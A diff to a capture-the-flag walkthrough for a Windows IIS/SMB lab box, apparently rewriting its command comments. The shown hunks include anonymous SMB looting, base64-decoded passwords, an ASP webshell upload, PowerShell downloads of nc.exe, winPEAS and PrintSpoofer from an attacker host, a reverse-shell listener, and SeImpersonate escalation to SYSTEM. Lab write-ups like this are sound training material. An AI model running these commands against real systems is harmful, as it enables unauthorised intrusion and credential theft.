@@ -43,8 +43,8 @@ user.txt at C:\Users\Bob\Desktop\user.txt
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: full port scan with high speed and service detection.
+# Why here: identify all open ports and versions to plan the initial attack.
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
 nmap -sVC -p80,135,139,445,3389,49663,49666,49667 $TARGET -oN service
 ```
@@ -69,8 +69,8 @@ Full technique: [smb-anonymous-enum.md](../../exploits/ad/smb-anonymous-enum.md)
 ### 2a. Find the writable share
 
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: enumerate SMB shares using the guest user.
+# Why here: find accessible shares that might contain sensitive files or allow uploads.
 netexec smb $TARGET -u 'guest' -p '' --shares
 # nt4wrksv  READ,WRITE
 ```
@@ -78,11 +78,11 @@ netexec smb $TARGET -u 'guest' -p '' --shares
 ### 2b. Pull the credential file
 
 ```bash
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: connect to the identified share and download the passwords file.
+# Why here: recover potential credentials stored in the share.
 smbclient //$TARGET/nt4wrksv -N -c "get passwords.txt"
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: read the content of the downloaded passwords file.
+# Why here: check for encoded credentials that need further decoding.
 cat passwords.txt
 # [User Passwords - Encoded]
 # Qm9iIC0gIVBAJCRXMHJEITEyMw==
@@ -92,8 +92,8 @@ cat passwords.txt
 ### 2c. Decode
 
 ```bash
-# What it does: decodes or encodes Base64 data.
-# Why here: convertir loot codificado en texto utilizable.
+# What it does: decode the Base64 encoded credentials.
+# Why here: retrieve cleartext passwords for Bob and Bill.
 echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
 # Bob - !P@$$W0rD!123
 echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
@@ -123,16 +123,16 @@ Response.Write(objCmd.StdOut.ReadAll())
 ### 3b. Upload via SMB
 
 ```bash
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: upload an ASP webshell using Bob's credentials.
+# Why here: establish a persistence point on the IIS server by abusing the writable share.
 smbclient //$TARGET/nt4wrksv -U 'Bob%!P@$$W0rD!123' -c "put shell.asp"
 ```
 
 ### 3c. Trigger over HTTP
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: execute a command through the uploaded ASP shell.
+# Why here: verify that the webshell is functional and can execute system commands.
 curl "http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami"
 # iis apppool\defaultapppool
 ```
@@ -143,22 +143,22 @@ curl "http://$TARGET:49663/nt4wrksv/shell.asp?cmd=whoami"
 
 ```bash
 # Attacker
-# What it does: copies or moves a file.
-# Why here: prepare payloads or place loot where the next command expects it.
+# What it does: copy the netcat binary to the current working directory.
+# Why here: prepare the binary for delivery to the target machine.
 cp /usr/share/windows-binaries/nc.exe .
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: start a temporary web server on the attacker machine.
+# Why here: serve the nc.exe binary to be downloaded by the target via the webshell.
 python3 -m http.server 80
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a listener to catch the Windows reverse shell.
+# Why here: wait for the incoming connection from the target's netcat execution.
 nc -lvnp 4444
 ```
 
 Pull `nc.exe` to `C:\Windows\Temp\` via the webshell, then trigger:
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send PowerShell commands via the ASP webshell.
+# Why here: automate the download and execution of the reverse shell binary.
 curl -G "http://$TARGET:49663/nt4wrksv/shell.asp" \
   --data-urlencode "cmd=powershell -c \"Invoke-WebRequest http://$LHOST/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe\""
 
@@ -186,7 +186,7 @@ type C:\Users\Bob\Desktop\user.txt
 
 ---
 
-## 6. Vamos a pasar winepeas para ver posibles metodos de escalar privilegios
+## 6. Privilege Escalation — winPEAS and PrintSpoofer
 
 powershell -c "Invoke-WebRequest http://192.168.160.214:8080/winPEAS.ps1 -OutFile C:\Windows\Temp\winPEAS.ps1"
 
@@ -195,24 +195,24 @@ powershell -c "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\winPEASA
 =========|| Checking for SNMP Passwords
 SNMP Key found at HKLM:\SYSTEM\CurrentControlSet\Services\SNMP
 
-## Vemos un path sin comillas puede ser vulnerable a Unquoted Service Path attack.
+## Unquoted Service Path vulnerability identified.
 Name: AWSLiteAgent 
 PathName: C:\Program Files\Amazon\XenTools\LiteAgent.exe
 
 ## Tenemos permiso de SeImpersonatePrivilege Impersonate a client after authentication Enabled 
 ```cmd
-Descargar prinspoofer
-REM What it does: execute a PowerShell command on Windows.
-REM Why here: download, execute or enumerate from the Windows foothold.
+Download PrintSpoofer
+REM What it does: download the PrintSpoofer exploit from the attacker.
+REM Why here: prepare for privilege escalation by leveraging the SeImpersonatePrivilege.
 powershell -c "Invoke-WebRequest http://192.168.160.214/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps.exe"
 
 :: Ejecutar  te da SYSTEM directamente
-REM What it does: executes a Windows binary by absolute path.
-REM Why here: disparar el payload que se ha subido a la victima.
+REM What it does: execute PrintSpoofer to spawn a SYSTEM shell.
+REM Why here: abuse the SeImpersonate privilege to elevate access to the highest level.
 C:\Windows\Temp\ps.exe -i -c cmd
 ```
 
-## Tenemos acesso commo administrador
+## Final access as SYSTEM / Administrator
 ```cmd
 REM What it does: execute a Windows command-line action.
 REM Why here: enumerate, transfer, replace or validate artifacts on the victim.
